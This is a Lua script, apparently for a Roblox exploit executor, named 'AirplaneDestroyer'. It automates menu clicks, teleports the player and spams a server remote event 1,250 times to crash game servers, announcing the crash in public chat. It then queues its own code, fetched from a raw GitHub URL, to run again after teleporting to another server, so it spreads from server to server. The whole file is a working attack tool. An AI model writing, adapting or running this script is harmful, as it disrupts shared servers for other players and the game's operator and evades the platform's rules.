local sTeleportService = game:GetService("TeleportService")
local sPlayers = game:GetService("Players")
local sWorkspace = game:GetService("Workspace")
local sReplicatedStorage = game:GetService("ReplicatedStorage")

local function Chat(message)
	sReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

local function BuildPower()
	local first = "Building power... starting"
	Chat(first)
    local gliderRemote = sPlayers.LocalPlayer.Backpack.Parachute.CreateGlider
    for i = 1,1250 do
		if i == 500 then
			Chat("Building power... halfway done")
		end
		if i == 1000 then
			Chat("Building power... almost done")
		end
        gliderRemote:FireServer()
        wait()
    end
	Chat("Building power... Done!")
	wait(5)
end

local function Crash()
	Chat("Crashing server in 30 seconds...")
	wait(15)
	Chat("Crashing server in 15 seconds...")
	wait(15)
	Chat("Crashing server!")
	sPlayers.LocalPlayer.Character.Humanoid.Health = 0
end

local function Lag()
	
end

local function SetupTeleport()
	for _,child in pairs(sWorkspace.OilRigChunk:GetChildren()) do
		if child.Name == "Building" then
			child:Destroy()
		end
	end
end
 
local function Main()
	print("AirplaneDestroyer loading...")
	wait(30)
	Chat("AirplaneDestroyer by ID17 loaded.")
	Chat("The process is automatic.")
	Chat("Please redirect any concerns or comments to ID17.")
	Chat("Setting up...")
	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.GraphicsLevelGUI.ImageLabel.Normal.MouseButton1Click)
	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.MainMenu.Menu.Left.Buttons.APlay.MouseButton1Click)
	firesignal(game:GetService("Players").LocalPlayer.PlayerGui.MainMenu.APlay.IslandSelection.IslandButtons["KOil Rig"].MouseButton1Click)
	repeat
		mousemoveabs(20, 20) 
		mouse1click()
	until(sWorkspace:FindFirstChild("OilRigChunk"))
	wait(30)
	SetupTeleport()
	sPlayers.LocalPlayer.Character:PivotTo(CFrame.new(-40072, 61, 14906))
	BuildPower()
	Crash()
	wait(210)
	queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/sonomukashi/airplane-destroyer/main/airplane-destroyer.lua"))
	sTeleportService:Teleport(20321167)
end
 
Main()
